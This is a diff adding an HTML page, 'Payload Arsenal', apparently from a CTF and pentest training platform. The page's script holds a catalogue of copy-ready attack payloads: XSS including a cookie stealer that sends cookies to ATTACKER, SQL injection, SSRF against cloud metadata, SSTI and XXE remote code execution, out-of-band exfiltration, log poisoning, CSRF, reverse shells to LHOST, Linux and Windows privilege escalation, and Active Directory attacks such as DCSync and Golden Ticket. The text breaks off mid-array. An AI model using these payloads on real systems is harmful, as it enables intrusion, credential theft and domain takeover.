@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CyberOps — Payload Arsenal</title>
+  <link rel="icon" type="image/svg+xml" href="favicon.svg">
+  <link rel="stylesheet" href="css/cyber.css">
+  <style>
+    .arsenal-layout { display:grid; grid-template-columns:200px 1fr; gap:0; height:calc(100vh - 90px); }
+    .cat-sidebar {
+      background:#020702; border-right:1px solid var(--border);
+      overflow-y:auto; padding:10px 0;
+    }
+    .cat-btn {
+      display:block; width:100%; padding:8px 14px; text-align:left;
+      font-family:var(--font-mono); font-size:11px; letter-spacing:.5px;
+      color:var(--green-dim); background:transparent; border:none;
+      border-left:2px solid transparent; cursor:pointer; transition:all .15s;
+    }
+    .cat-btn:hover, .cat-btn.active {
+      color:var(--green); background:#040d04; border-left-color:var(--green);
+    }
+    .cat-count {
+      float:right; font-size:9px; background:var(--bg-card2);
+      padding:1px 5px; border-radius:2px; color:var(--green-dim);
+    }
+
+    .payload-area { display:flex; flex-direction:column; overflow:hidden; }
+    .payload-toolbar {
+      padding:10px 14px; border-bottom:1px solid var(--border); background:#020702;
+      display:flex; gap:8px; align-items:center; flex-shrink:0; flex-wrap:wrap;
+    }
+    .payload-list { flex:1; overflow-y:auto; padding:10px 14px; }
+
+    .payload-card {
+      background:var(--bg-card2); border:1px solid var(--border); border-radius:5px;
+      margin-bottom:8px; overflow:hidden; transition:border-color .15s;
+    }
+    .payload-card:hover { border-color:var(--green-dim); }
+    .payload-card.bookmarked-card { border-left:3px solid var(--yellow); }
+
+    .payload-header {
+      display:flex; align-items:center; gap:10px; padding:10px 14px;
+      cursor:pointer;
+    }
+    .payload-name { flex:1; color:var(--green); font-size:12px; }
+    .payload-tag { font-size:9px; padding:2px 6px; border-radius:2px; flex-shrink:0; }
+
+    .payload-body { padding:0 14px 12px; display:none; }
+    .payload-body.show { display:block; }
+    .payload-code {
+      background:#010301; border:1px solid rgba(34,197,34,.15); border-radius:4px;
+      padding:10px 12px; font-size:12px; color:#8affa0; font-family:var(--font-mono);
+      white-space:pre-wrap; word-break:break-all; line-height:1.7;
+      position:relative; cursor:text; max-height:220px; overflow-y:auto;
+    }
+    .payload-desc { font-size:11px; color:var(--green-dim); margin-bottom:8px; line-height:1.6; }
+    .payload-actions { display:flex; gap:6px; margin-top:8px; }
+    .copy-btn {
+      font-size:10px; padding:4px 10px; border:1px solid var(--green-dim);
+      color:var(--green-dim); background:transparent; border-radius:3px;
+      cursor:pointer; font-family:var(--font-mono); letter-spacing:.5px; transition:all .15s;
+    }
+    .copy-btn:hover { border-color:var(--green); color:var(--green); background:rgba(34,197,34,.06); }
+    .copy-btn.copied { border-color:var(--yellow); color:var(--yellow); }
+    .bookmark-btn { background:none; border:none; cursor:pointer; font-size:14px; padding:2px; transition:opacity .15s; }
+    .bookmark-btn:hover { opacity:.7; }
+
+    .os-tag { font-size:9px; padding:1px 5px; border-radius:2px; margin-right:4px; }
+    .os-linux { background:#1a2e1a; color:var(--green); }
+    .os-windows { background:#1a2e3a; color:var(--blue); }
+    .os-any { background:#2e1a2e; color:var(--purple); }
+    .os-web { background:#1a1a2e; color:var(--cyan); }
+
+    .custom-payload-area {
+      border:1px solid var(--border); border-radius:5px; padding:14px;
+      background:var(--bg-card2); margin-bottom:10px;
+    }
+
+    #search-input { flex:1; max-width:300px; }
+    .result-count { font-size:11px; color:var(--green-dim); white-space:nowrap; }
+
+    .section-header {
+      font-size:10px; color:var(--green-dim); letter-spacing:1.5px;
+      padding:6px 0; border-bottom:1px solid var(--border); margin-bottom:10px;
+      display:flex; align-items:center; justify-content:space-between;
+    }
+
+    .var-hint {
+      font-size:10px; color:var(--yellow); background:rgba(197,165,34,.08);
+      border:1px solid rgba(197,165,34,.2); border-radius:3px;
+      padding:6px 10px; margin-bottom:8px; font-family:var(--font-mono);
+    }
+  </style>
+</head>
+<body>
+<canvas id="matrix" class="matrix-canvas"></canvas>
+<div class="app">
+  <nav class="sidebar">
+    <div class="sidebar-logo"><h1>CYBEROPS</h1><p>UNIFIED PLATFORM v4.0</p></div>
+    <div class="nav-section">
+      <div class="nav-label">CORE</div>
+      <a href="dashboard.html" class="nav-item"><div class="nav-dot"></div>DASHBOARD</a>
+      <a href="ctf.html" class="nav-item"><div class="nav-dot"></div>CTF ARENA</a>
+      <a href="training.html" class="nav-item"><div class="nav-dot"></div>SEC TRAINING</a>
+      <a href="lab.html" class="nav-item"><div class="nav-dot"></div>PENTEST LAB</a>
+      <a href="hack-lab.html" class="nav-item"><div class="nav-dot"></div>HACK LAB</a>
+    </div>
+    <div class="nav-section">
+      <div class="nav-label">INTELLIGENCE</div>
+      <a href="scanner.html" class="nav-item"><div class="nav-dot"></div>GHOST SCANNER</a>
+      <a href="threat-intel.html" class="nav-item"><div class="nav-dot"></div>THREAT INTEL</a>
+      <a href="ai-terminal.html" class="nav-item"><div class="nav-dot"></div>GHOST-AI</a>
+      <a href="analytics.html" class="nav-item"><div class="nav-dot"></div>ANALYTICS</a>
+      <a href="writeups.html" class="nav-item"><div class="nav-dot"></div>WRITEUPS</a>
+      <a href="news-feed.html" class="nav-item"><div class="nav-dot"></div>NEWS FEED</a>
+      <a href="code-auditor.html" class="nav-item"><div class="nav-dot"></div>CODE AUDITOR</a>
+    </div>
+    <div class="nav-section">
+      <div class="nav-label">TOOLS</div>
+      <a href="ctf-events.html" class="nav-item"><div class="nav-dot"></div>CTF EVENTS</a>
+      <a href="bug-bounty.html" class="nav-item"><div class="nav-dot"></div>BUG BOUNTY</a>
+      <a href="roadmap.html" class="nav-item"><div class="nav-dot"></div>OSCP ROADMAP</a>
+      <a href="payload-arsenal.html" class="nav-item active"><div class="nav-dot"></div>PAYLOAD ARSENAL</a>
+    </div>
+    <div class="nav-section">
+      <div class="nav-label">ACCOUNT</div>
+      <a href="profile.html" class="nav-item"><div class="nav-dot"></div>MY PROFILE</a>
+      <a class="nav-item" onclick="signOut()" style="cursor:pointer"><div class="nav-dot"></div>SIGN OUT</a>
+    </div>
+    <div class="sidebar-footer">
+      <div class="u-label">OPERATOR</div>
+      <div class="u-name" id="sb-username">loading...</div>
+      <div class="u-status"><div class="status-dot"></div>ARSENAL LOADED</div>
+    </div>
+  </nav>
+
+  <div class="main" style="overflow:hidden">
+    <div class="topbar">
+      <span class="topbar-title">// PAYLOAD ARSENAL — CTF & SECURITY REFERENCE</span>
+      <div class="topbar-right">
+        <span class="tb-item">PAYLOADS <span id="tb-count" style="color:var(--green)">0</span></span>
+        <span class="tb-item">BOOKMARKS <span id="tb-bm" style="color:var(--yellow)">0</span></span>
+        <span class="tb-item">CUSTOM <span id="tb-custom">0</span></span>
+      </div>
+    </div>
+
+    <div class="arsenal-layout">
+      <!-- Category sidebar -->
+      <div class="cat-sidebar">
+        <div style="padding:8px 14px 4px;font-size:9px;color:#0f3f0f;letter-spacing:1.5px">CATEGORIES</div>
+        <button class="cat-btn active" onclick="setCategory('all',this)">ALL <span class="cat-count" id="cnt-all">0</span></button>
+        <button class="cat-btn" onclick="setCategory('bookmarks',this)">⭐ BOOKMARKS <span class="cat-count" id="cnt-bm">0</span></button>
+        <button class="cat-btn" onclick="setCategory('custom',this)">✏ CUSTOM <span class="cat-count" id="cnt-custom">0</span></button>
+        <div style="padding:8px 14px 4px;font-size:9px;color:#0f3f0f;letter-spacing:1.5px;margin-top:6px">WEB ATTACKS</div>
+        <button class="cat-btn" onclick="setCategory('xss',this)">XSS <span class="cat-count" id="cnt-xss">0</span></button>
+        <button class="cat-btn" onclick="setCategory('sqli',this)">SQLi <span class="cat-count" id="cnt-sqli">0</span></button>
+        <button class="cat-btn" onclick="setCategory('ssrf',this)">SSRF <span class="cat-count" id="cnt-ssrf">0</span></button>
+        <button class="cat-btn" onclick="setCategory('ssti',this)">SSTI <span class="cat-count" id="cnt-ssti">0</span></button>
+        <button class="cat-btn" onclick="setCategory('xxe',this)">XXE <span class="cat-count" id="cnt-xxe">0</span></button>
+        <button class="cat-btn" onclick="setCategory('lfi',this)">LFI/RFI <span class="cat-count" id="cnt-lfi">0</span></button>
+        <button class="cat-btn" onclick="setCategory('csrf',this)">CSRF <span class="cat-count" id="cnt-csrf">0</span></button>
+        <div style="padding:8px 14px 4px;font-size:9px;color:#0f3f0f;letter-spacing:1.5px;margin-top:6px">POST-EXPLOITATION</div>
+        <button class="cat-btn" onclick="setCategory('revshell',this)">REVERSE SHELLS <span class="cat-count" id="cnt-revshell">0</span></button>
+        <button class="cat-btn" onclick="setCategory('privesc',this)">PRIV-ESC <span class="cat-count" id="cnt-privesc">0</span></button>
+        <button class="cat-btn" onclick="setCategory('activedir',this)">ACTIVE DIRECTORY <span class="cat-count" id="cnt-activedir">0</span></button>
+        <div style="padding:8px 14px 4px;font-size:9px;color:#0f3f0f;letter-spacing:1.5px;margin-top:6px">REFERENCE</div>
+        <button class="cat-btn" onclick="setCategory('linux',this)">LINUX COMMANDS <span class="cat-count" id="cnt-linux">0</span></button>
+        <button class="cat-btn" onclick="setCategory('windows',this)">WINDOWS COMMANDS <span class="cat-count" id="cnt-windows">0</span></button>
+      </div>
+
+      <!-- Payload list -->
+      <div class="payload-area">
+        <div class="payload-toolbar">
+          <input type="text" id="search-input" class="form-input" placeholder="Search payloads..." oninput="renderPayloads()" style="padding:7px 12px">
+          <select id="os-filter" class="form-select" style="width:auto" onchange="renderPayloads()">
+            <option value="">ALL OS</option>
+            <option value="linux">Linux</option>
+            <option value="windows">Windows</option>
+            <option value="web">Web</option>
+            <option value="any">Any</option>
+          </select>
+          <span class="result-count" id="result-count">0 results</span>
+          <button class="btn btn-sm btn-yellow" onclick="showAddCustom()" style="margin-left:auto">+ CUSTOM</button>
+        </div>
+
+        <div class="payload-list">
+          <div id="add-custom-form" style="display:none" class="custom-payload-area">
+            <div style="font-size:11px;color:var(--green);margin-bottom:10px;letter-spacing:1px">ADD CUSTOM PAYLOAD</div>
+            <div class="g2" style="gap:8px">
+              <div class="form-group" style="margin-bottom:8px">
+                <label class="form-label">NAME</label>
+                <input type="text" id="cp-name" class="form-input" placeholder="My custom XSS bypass">
+              </div>
+              <div class="form-group" style="margin-bottom:8px">
+                <label class="form-label">CATEGORY</label>
+                <select id="cp-cat" class="form-select">
+                  <option value="xss">XSS</option><option value="sqli">SQLi</option>
+                  <option value="ssrf">SSRF</option><option value="ssti">SSTI</option>
+                  <option value="lfi">LFI/RFI</option><option value="revshell">Reverse Shell</option>
+                  <option value="privesc">Priv-Esc</option><option value="linux">Linux</option>
+                  <option value="windows">Windows</option><option value="custom">Custom</option>
+                </select>
+              </div>
+            </div>
+            <div class="form-group" style="margin-bottom:8px">
+              <label class="form-label">DESCRIPTION</label>
+              <input type="text" id="cp-desc" class="form-input" placeholder="Brief description">
+            </div>
+            <div class="form-group" style="margin-bottom:8px">
+              <label class="form-label">PAYLOAD / COMMAND</label>
+              <textarea id="cp-code" class="form-textarea" rows="3" placeholder="Paste payload here..."></textarea>
+            </div>
+            <div style="display:flex;gap:8px">
+              <button class="btn btn-sm btn-primary" onclick="saveCustomPayload()">SAVE</button>
+              <button class="btn btn-sm" onclick="document.getElementById('add-custom-form').style.display='none'" style="border:1px solid var(--border);color:var(--green-dim);background:transparent">CANCEL</button>
+            </div>
+          </div>
+
+          <div id="payload-list-inner"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script src="js/supabase.js"></script>
+<script src="js/config.js"></script>
+<script>
+let currentCategory = 'all';
+let bookmarks = JSON.parse(localStorage.getItem('arsenal_bm') || '[]');
+let customPayloads = JSON.parse(localStorage.getItem('arsenal_custom') || '[]');
+
+const PAYLOADS = [
+  // ── XSS ──
+  { id:'x1', cat:'xss', os:'web', name:'Basic Script Tag', desc:'Classic XSS — inject a script tag directly. Works when HTML is not sanitised.',
+    code:'<script>alert(document.domain)<\/script>' },
+  { id:'x2', cat:'xss', os:'web', name:'img onerror (no quotes)', desc:'Works when quote characters are filtered. The onerror event fires even if the image src is invalid.',
+    code:"<img src=x onerror=alert(1)>" },
+  { id:'x3', cat:'xss', os:'web', name:'SVG onload', desc:'SVG elements support event handlers. Useful when <script> is blocked.',
+    code:'<svg onload=alert(document.cookie)>' },
+  { id:'x4', cat:'xss', os:'web', name:'Input autofocus onfocus', desc:'Self-activating — fires as soon as the page loads without any user interaction.',
+    code:'<input autofocus onfocus=alert(1)>' },
+  { id:'x5', cat:'xss', os:'web', name:'HTML entity bypass', desc:'Bypasses filters that block angle brackets by using HTML entities which the browser decodes.',
+    code:'&lt;img src=x onerror=alert(1)&gt;' },
+  { id:'x6', cat:'xss', os:'web', name:'javascript: URI', desc:'Injected into href attributes. Executes JavaScript when the link is clicked.',
+    code:"<a href=\"javascript:alert('XSS')\">Click me</a>" },
+  { id:'x7', cat:'xss', os:'web', name:'DOM XSS — document.write', desc:'DOM-based XSS via unsafe document.write sink. Used when the payload is reflected in JS context.',
+    code:'";alert(document.cookie);//' },
+  { id:'x8', cat:'xss', os:'web', name:'Polyglot XSS', desc:'Single payload that executes across multiple injection contexts (attribute, tag, script block).',
+    code:"jaVasCript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>" },
+  { id:'x9', cat:'xss', os:'web', name:'Cookie Stealer (conceptual)', desc:'Demonstrates cookie exfiltration. Replace ATTACKER with a server you control (e.g., Burp Collaborator in CTF).',
+    code:"<script>fetch('https://ATTACKER/?c='+btoa(document.cookie))<\/script>" },
+
+  // ── SQLi ──
+  { id:'s1', cat:'sqli', os:'web', name:'Auth Bypass — OR 1=1', desc:'Classic authentication bypass. Closes the string and adds a condition that is always true.',
+    code:"' OR '1'='1" },
+  { id:'s2', cat:'sqli', os:'web', name:'Auth Bypass — Comment', desc:'Injects into the username field and comments out the rest of the query including the password check.',
+    code:"admin'--" },
+  { id:'s3', cat:'sqli', os:'web', name:'UNION SELECT — Column Count', desc:'Find number of columns returned by the query. Increment NULLs until no error.',
+    code:"' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT NULL,NULL,NULL--" },
+  { id:'s4', cat:'sqli', os:'web', name:'UNION SELECT — Data Extraction', desc:'Extract data once column count is known. Substitute col positions for actual data.',
+    code:"' UNION SELECT username,password,NULL FROM users--" },
+  { id:'s5', cat:'sqli', os:'web', name:'Time-Based Blind (MySQL)', desc:'When no output is visible, time delays confirm injection. 5-second delay = vulnerable.',
+    code:"'; IF (1=1) WAITFOR DELAY '0:0:5'--    -- MSSQL\n' AND SLEEP(5)--                          -- MySQL\n' AND pg_sleep(5)--                       -- PostgreSQL" },
+  { id:'s6', cat:'sqli', os:'web', name:'Error-Based (MySQL)', desc:'Extracts data through error messages when error output is visible.',
+    code:"' AND extractvalue(1,concat(0x7e,(SELECT version())))--" },
+  { id:'s7', cat:'sqli', os:'web', name:'Read Local File (MySQL)', desc:'Read server-side files if FILE privilege is granted. FILE_PATH = absolute path.',
+    code:"' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--" },
+  { id:'s8', cat:'sqli', os:'web', name:'Stacked Queries (MSSQL)', desc:'Execute multiple statements. Used to call xp_cmdshell for RCE on MSSQL.',
+    code:"'; EXEC xp_cmdshell('whoami')--" },
+
+  // ── SSRF ──
+  { id:'ss1', cat:'ssrf', os:'web', name:'AWS EC2 Metadata', desc:'Classic SSRF target on AWS. Returns IAM role credentials if metadata service is accessible.',
+    code:'http://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/' },
+  { id:'ss2', cat:'ssrf', os:'web', name:'GCP Metadata', desc:'Google Cloud Platform instance metadata endpoint.',
+    code:'http://metadata.google.internal/computeMetadata/v1/\nHeader required: Metadata-Flavor: Google' },
+  { id:'ss3', cat:'ssrf', os:'web', name:'Internal Service Discovery', desc:'Probe internal services. Common ports: 6379 Redis, 27017 MongoDB, 5432 PostgreSQL.',
+    code:'http://localhost:6379/\nhttp://127.0.0.1:27017/\nhttp://internal-host:8080/admin' },
+  { id:'ss4', cat:'ssrf', os:'web', name:'Protocol Wrappers', desc:'Alternative schemes to bypass URL filtering. Works when http:// is blocked.',
+    code:'file:///etc/passwd\ndict://localhost:6379/info\ngopher://127.0.0.1:6379/_INFO' },
+  { id:'ss5', cat:'ssrf', os:'web', name:'IPv6 / 0x7f bypass', desc:'Bypass localhost/127.0.0.1 filters using alternative representations.',
+    code:'http://[::1]/\nhttp://0x7f000001/\nhttp://0177.0.0.1/\nhttp://127.1/' },
+
+  // ── SSTI ──
+  { id:'st1', cat:'ssti', os:'web', name:'Detection Probe', desc:'Test all major template engines. If the math evaluates, SSTI is confirmed. {{7*7}}=49 = Jinja2/Twig.',
+    code:'{{7*7}}\n${7*7}\n<%= 7*7 %>\n#{7*7}\n*{7*7}' },
+  { id:'st2', cat:'ssti', os:'web', name:'Jinja2 — RCE', desc:'Remote code execution via Jinja2 template injection in Python/Flask apps. MRO traversal to access OS module.',
+    code:"{{''.__class__.__mro__[1].__subclasses__()[439]('id',shell=True,stdout=-1).communicate()[0].decode()}}\n\n-- simpler if __builtins__ accessible:\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}" },
+  { id:'st3', cat:'ssti', os:'web', name:'Twig — RCE (PHP)', desc:'Template injection in Twig (PHP Symfony). Uses _self to access environment filter.',
+    code:"{{_self.env.registerUndefinedFilterCallback('exec')}}\n{{_self.env.getFilter('id')}}" },
+  { id:'st4', cat:'ssti', os:'web', name:'Freemarker (Java)', desc:'Freemarker template injection leading to Java code execution.',
+    code:'<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}' },
+
+  // ── XXE ──
+  { id:'xe1', cat:'xxe', os:'web', name:'Basic File Read', desc:'Classic XXE — defines an external entity pointing to a local file and includes it in the response.',
+    code:`<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root><data>&xxe;</data></root>` },
+  { id:'xe2', cat:'xxe', os:'web', name:'OOB Exfiltration (DTD)', desc:'Out-of-band XXE when content is not reflected. Sends file contents to attacker-controlled server.',
+    code:`<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">
+  %dtd;]>
+<foo>&exfil;</foo>
+
+<!-- evil.dtd on attacker server: -->
+<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://ATTACKER/?x=%file;'>">
+%all;` },
+  { id:'xe3', cat:'xxe', os:'web', name:'SSRF via XXE', desc:'Use XXE to perform SSRF — target internal network resources via the XML parser.',
+    code:`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<foo>&xxe;</foo>` },
+  { id:'xe4', cat:'xxe', os:'web', name:'XInclude Attack', desc:'When you can only control part of an XML document and cannot define a DOCTYPE.',
+    code:`<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>` },
+
+  // ── LFI ──
+  { id:'l1', cat:'lfi', os:'web', name:'Basic Path Traversal', desc:'Classic directory traversal. Depth depends on web root location — adjust ../ count.',
+    code:'../../../etc/passwd\n..\\..\\..\\windows\\system32\\drivers\\etc\\hosts' },
+  { id:'l2', cat:'lfi', os:'web', name:'Null Byte Bypass (legacy)', desc:'Older PHP versions truncate strings at null byte — terminates the appended extension.',
+    code:'../../../etc/passwd%00\n../../../etc/passwd\x00' },
+  { id:'l3', cat:'lfi', os:'web', name:'PHP Wrappers — Base64', desc:'Read PHP source code as base64 via the php:// stream wrapper (decoded to reveal source).',
+    code:'php://filter/convert.base64-encode/resource=index.php' },
+  { id:'l4', cat:'lfi', os:'web', name:'PHP Wrapper — Data (RFI->RCE)', desc:'Inject PHP code via the data:// wrapper for remote file inclusion leading to code execution.',
+    code:'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+' },
+  { id:'l5', cat:'lfi', os:'web', name:'Log Poisoning (Apache)', desc:'Inject PHP into access log via User-Agent, then include the log file for RCE.',
+    code:`# Step 1: Poison the log (via User-Agent header):
+User-Agent: <?php system($_GET['cmd']); ?>
+
+# Step 2: Include the log:
+/index.php?page=../../../var/log/apache2/access.log&cmd=id` },
+
+  // ── CSRF ──
+  { id:'cs1', cat:'csrf', os:'web', name:'GET Request CSRF', desc:'Minimal CSRF for GET-based state changes. An img tag triggers automatic request on page load.',
+    code:`<img src="https://TARGET/action?param=value" width="0" height="0">` },
+  { id:'cs2', cat:'csrf', os:'web', name:'Auto-Submit POST Form', desc:'Hidden form that submits automatically. Attacker hosts this on evil.com — victim just visits the page.',
+    code:`<form action="https://TARGET/transfer" method="POST">
+  <input type="hidden" name="to" value="attacker">
+  <input type="hidden" name="amount" value="9999">
+</form>
+<script>document.forms[0].submit();</script>` },
+  { id:'cs3', cat:'csrf', os:'web', name:'JSON CSRF', desc:'Bypass same-origin for JSON endpoints using text/plain content-type to force a CSRF condition.',
+    code:`<form action="https://TARGET/api/action" method="POST" enctype="text/plain">
+  <input name='{"key":"value","padding":"' value='"}'>
+</form>` },
+
+  // ── REVERSE SHELLS ──
+  { id:'r1', cat:'revshell', os:'linux', name:'Bash TCP Reverse Shell', desc:'Set up a listener first: nc -lvnp LPORT. Replace LHOST and LPORT with your listener details.',
+    code:'bash -i >& /dev/tcp/LHOST/LPORT 0>&1\n\n# Alternative:\nexec 5<>/dev/tcp/LHOST/LPORT; cat <&5 | while read line; do $line 2>&5 >&5; done' },
+  { id:'r2', cat:'revshell', os:'any', name:'Python3 Reverse Shell', desc:'Cross-platform Python reverse shell. Works on any system with Python3 installed.',
+    code:`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
+  { id:'r3', cat:'revshell', os:'linux', name:'Netcat (with -e)', desc:'Classic netcat reverse shell. Requires a version compiled with -e support (ncat, traditional nc).',
+    code:'nc -e /bin/bash LHOST LPORT\nncat LHOST LPORT -e /bin/bash' },
+  { id:'r4', cat:'revshell', os:'linux', name:'Netcat mkfifo (no -e)', desc:'Works with OpenBSD netcat which lacks -e. Uses a named pipe to create a full duplex connection.',
+    code:'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc LHOST LPORT >/tmp/f' },
+  { id:'r5', cat:'revshell', os:'web', name:'PHP Reverse Shell', desc:'One-liner PHP reverse shell for web shells or file upload vulnerabilities.',
+    code:`php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'` },
+  { id:'r6', cat:'revshell', os:'windows', name:'PowerShell Reverse Shell', desc:'Windows PowerShell TCP reverse shell. Often used after initial foothold on Windows targets.',
+    code:`powershell -NoP -NonI -W Hidden -Exec Bypass -Command "& {$client=New-Object Net.Sockets.TCPClient('LHOST',LPORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"` },
+  { id:'r7', cat:'revshell', os:'linux', name:'Socat Reverse Shell (TTY)', desc:'Socat gives a full interactive TTY — arrow keys, tab completion, Ctrl+C all work.',
+    code:`# Listener (attacker):
+socat file:\`tty\`,raw,echo=0 tcp-listen:LPORT
+
+# Target:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT` },
+  { id:'r8', cat:'revshell', os:'linux', name:'Upgrade Shell to TTY', desc:'After getting a dumb shell, upgrade to a proper interactive TTY using Python.',
+    code:`python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Then: Ctrl+Z
+stty raw -echo; fg
+# Then: reset
+export TERM=xterm` },
+
+  // ── PRIV-ESC ──
+  { id:'pe1', cat:'privesc', os:'linux', name:'Enumeration — SUID Binaries', desc:'Find SUID-set binaries. Cross-reference results with GTFOBins to identify exploitable binaries.',
+    code:'find / -perm -4000 -type f 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null' },
+  { id:'pe2', cat:'privesc', os:'linux', name:'Enumeration — sudo -l', desc:'Check what commands the current user can run as root without a password.',
+    code:'sudo -l\n# If (ALL:ALL) NOPASSWD: /usr/bin/vim — exploit with:\nsudo vim -c ":!bash"' },
+  { id:'pe3', cat:'privesc', os:'linux', name:'Cron Job Enumeration', desc:'Look for writable scripts run by cron as root. Modify the script to get a root shell.',
+    code:'cat /etc/crontab\nls -la /etc/cron*\ncat /var/spool/cron/crontabs/root 2>/dev/null\n# Also check for writable cron paths:\nfind /etc/cron* -writable 2>/dev/null' },
+  { id:'pe4', cat:'privesc', os:'linux', name:'Writable /etc/passwd', desc:'If /etc/passwd is writable, add a root-equivalent user with a known password hash.',
+    code:`# Generate password hash:
+openssl passwd -1 -salt abc password123
+# Result: $1$abc$hash
+
+# Add to /etc/passwd:
+echo 'hacker:$1$abc$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
+su hacker` },
+  { id:'pe5', cat:'privesc', os:'linux', name:'Kernel Exploit Check', desc:'Identify kernel version and search for local privilege escalation exploits.',
+    code:'uname -a\ncat /proc/version\ncat /etc/*-release\n# Search: searchsploit linux kernel 5.x local privilege escalation' },
+  { id:'pe6', cat:'privesc', os:'linux', name:'PATH Hijacking', desc:'If a SUID binary calls a command without full path, create a malicious version earlier in PATH.',
+    code:`# If SUID binary calls 'service', 'python', etc.:
+export PATH=/tmp:$PATH
+echo '#!/bin/bash\nbash -p' > /tmp/service
+chmod +x /tmp/service
+# Run the SUID binary — it executes /tmp/service as root` },
+  { id:'pe7', cat:'privesc', os:'windows', name:'Windows Enum — PowerShell', desc:'Quick Windows privilege escalation enumeration commands.',
+    code:`whoami /priv
+whoami /groups
+net localgroup administrators
+Get-LocalGroupMember -Group "Administrators"
+# Unquoted service paths:
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"
+# AlwaysInstallElevated:
+reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated` },
+  { id:'pe8', cat:'privesc', os:'windows', name:'Token Impersonation Check', desc:'Check for SeImpersonatePrivilege — exploitable with Juicy/Rotten/Sweet Potato on older Windows.',
+    code:`whoami /priv | findstr "SeImpersonatePrivilege"
+# If enabled, use:
+# JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a "/c whoami" -t *
+# Or use PrintSpoofer on newer Windows versions` },
+
+  // ── ACTIVE DIRECTORY ──
+  { id:'ad1', cat:'activedir', os:'windows', name:'BloodHound Enumeration', desc:'Collect AD data with SharpHound for BloodHound graph analysis. Reveals attack paths to Domain Admin.',
+    code:`# PowerShell (on domain-joined machine):
+Import-Module SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\temp
+
+# Or using SharpHound.exe:
+SharpHound.exe -c All --outputdirectory C:\\temp` },
+  { id:'ad2', cat:'activedir', os:'windows', name:'Kerberoasting', desc:'Request TGS tickets for SPNs and crack the service account password hash offline.',
+    code:`# PowerShell — Get SPNs:
+Get-DomainUser -SPN | select samaccountname, serviceprincipalname
+
+# Request TGS and dump hash (Rubeus):
+Rubeus.exe kerberoast /outfile:hashes.txt
+
+# Crack with hashcat:
+hashcat -m 13100 hashes.txt wordlist.txt` },
+  { id:'ad3', cat:'activedir', os:'windows', name:'AS-REP Roasting', desc:'Target accounts with Kerberos pre-authentication disabled. Crack the AS-REP hash offline.',
+    code:`# Impacket (from Linux):
+GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP
+
+# Rubeus (on Windows):
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+
+# Crack:
+hashcat -m 18200 asrep.txt wordlist.txt` },
+  { id:'ad4', cat:'activedir', os:'windows', name:'Pass-the-Hash (PtH)', desc:'Use an NTLM hash without cracking to authenticate. Requires local admin hash.',
+    code:`# Impacket PsExec:
+psexec.py -hashes :NTLM_HASH DOMAIN/Administrator@TARGET
+
+# Evil-WinRM:
+evil-winrm -i TARGET -u Administrator -H NTLM_HASH
+
+# CrackMapExec:
+cme smb TARGET -u Administrator -H NTLM_HASH --local-auth` },
+  { id:'ad5', cat:'activedir', os:'windows', name:'DCSync Attack', desc:'Simulate a domain controller to pull password hashes for any user including KRBTGT.',
+    code:`# Requires Domain Admin or Replication rights:
+# Impacket:
+secretsdump.py DOMAIN/Administrator:Password@DC_IP
+
+# Mimikatz:
+lsadump::dcsync /domain:DOMAIN /user:Administrator
+lsadump::dcsync /domain:DOMAIN /all /csv` },
+  { id:'ad6', cat:'activedir', os:'windows', name:'Golden Ticket', desc:'Forge a TGT using the KRBTGT hash. Valid for 10 years by default. Full domain persistence.',
+    code:`# Mimikatz:
+# Step 1 — Get domain SID and KRBTGT hash (via DCSync):
+lsadump::dcsync /user:krbtgt
+
+# Step 2 — Create Golden Ticket:
+kerberos::golden /user:Administrator /domain:DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /id:500 /ptt` },
+
+  // ── LINUX COMMANDS ──
